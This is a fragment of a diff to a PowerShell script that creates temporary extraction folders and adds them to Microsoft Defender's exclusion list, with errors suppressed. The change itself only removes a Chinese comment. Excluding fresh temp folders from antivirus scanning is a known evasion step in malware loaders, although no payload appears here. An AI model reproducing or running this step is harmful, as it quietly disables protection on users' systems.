@@ -71,7 +71,6 @@ $ExtractDir = "$TempDir\Extracted"
 if (-not (Test-Path $TempDir))    { New-Item -Path $TempDir -ItemType Directory -Force | Out-Null }
 if (-not (Test-Path $ExtractDir)) { New-Item -Path $ExtractDir -ItemType Directory -Force | Out-Null }
 
-# 1. 將暫存與解壓目錄加入 Defender 排除名單 (白名單)
 Write-Host "[!] Adding Exclusion Paths to Defender..." -ForegroundColor Cyan
 Add-MpPreference -ExclusionPath $TempDir -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionPath $ExtractDir -ErrorAction SilentlyContinue
